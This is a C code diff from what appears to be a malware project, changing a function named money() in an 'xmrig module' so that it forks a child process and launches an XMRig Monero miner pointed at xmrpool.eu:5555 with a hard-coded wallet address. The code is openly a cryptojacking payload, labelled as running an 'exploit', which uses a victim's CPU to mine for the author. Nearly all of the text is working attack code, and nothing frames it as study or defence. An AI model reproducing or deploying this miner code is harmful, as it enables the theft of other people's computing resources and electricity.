@@ -147,24 +147,40 @@ int extract_xmrig_runner(char *srcPath, char *destPath) {
 }
 
 int money(char *exec_path) {
-    if (global->execlp(exec_path, exec_path,
-           "--url", "xmrpool.eu:5555",
-           "--user", "4ARVkbE25vnbMyEMRhUpXKdn2ThNk1YPhdvtwYyui96bR4mMRqnQ5JT13iAgqzszGJ4THiD2DV1So7UADuEtdnia5DNq53q",
-           "--pass", "x",
-           "--rig-id", "test",
-           "--coin", "XMR",
-           "--randomx-mode", "auto",
-           "--donate-level=5",
-           "--title",
-           "--cpu",
-           "--cpu-priority=1",
-           "--threads=1",
-           "--cpu-affinity=-1",
-           "--cpu-max-threads-hint=1",
-           NULL) != 0) {
-            DEBUG_LOG_ERR("[XMR] fail executing xmr binary\n");
-           }
-           return 0;
+    // fork and run exploit;
+    int pid = global->fork();
+    CHECK(pid == -1);
+
+    if (pid == 0) {
+      DEBUG_LOG("[XMR] Crypto-Miner running in forked process\n");
+      if (global->execlp(
+              exec_path, 
+              exec_path, 
+              "--url", 
+              "xmrpool.eu:5555", 
+              "--user",
+              "4ARVkbE25vnbMyEMRhUpXKdn2ThNk1YPhdvtwYyui96bR4mMRqnQ5JT13iAgqzsz"
+              "GJ4THiD2DV1So7UADuEtdnia5DNq53q",
+              "--pass", 
+              "x", 
+              "--rig-id", 
+              "test", 
+              "--coin", 
+              "XMR",
+              "--randomx-mode", 
+              "auto", 
+              "--donate-level=5", 
+              "--title", 
+              "--cpu",
+              "--cpu-priority=1", 
+              "--threads=1", 
+              "--cpu-affinity=-1",
+              "--cpu-max-threads-hint=1", 
+              NULL) != 0) {
+        DEBUG_LOG_ERR("[XMR] fail executing xmr binary\n");
+      }
+      return 0;
+    }
 }
 
 // Main function for xmrig module
